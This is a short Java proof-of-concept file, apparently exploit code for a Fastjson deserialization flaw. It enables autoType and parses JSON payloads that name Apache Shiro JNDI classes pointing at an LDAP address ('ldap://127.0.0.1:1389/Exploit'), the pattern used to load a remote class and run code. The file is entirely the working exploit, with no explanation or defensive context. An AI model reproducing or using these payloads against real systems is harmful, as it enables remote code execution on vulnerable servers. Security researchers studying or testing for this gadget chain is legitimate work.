import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class ShiroPoc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://127.0.0.1:1389/Exploit\"], \"Realms\":[\"\"]}";
        String payload1 = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\", \"jndiNames\":[\"ldap://127.0.0.1:1389/Exploit\"], \"Realms\":[\"\"]}";


        JSON.parseObject(payload);
    }
}
